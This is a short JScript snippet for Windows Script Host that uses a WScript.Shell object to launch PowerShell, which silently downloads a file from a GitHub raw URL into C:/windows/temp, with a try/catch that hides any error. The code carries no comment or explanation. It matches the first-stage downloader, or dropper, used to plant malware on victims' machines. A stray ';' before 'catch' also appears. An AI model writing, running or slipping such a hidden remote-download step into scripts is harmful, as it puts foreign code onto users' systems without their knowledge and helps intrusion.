try{
wsh = new ActiveXObject("WScript.Shell");
var f1 = "powershell.exe -command(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Kwhitebear/teet/main/abc.txt','C:/windows/temp/abc.txt')";
wsh.Run(f1);
};catch(err){};
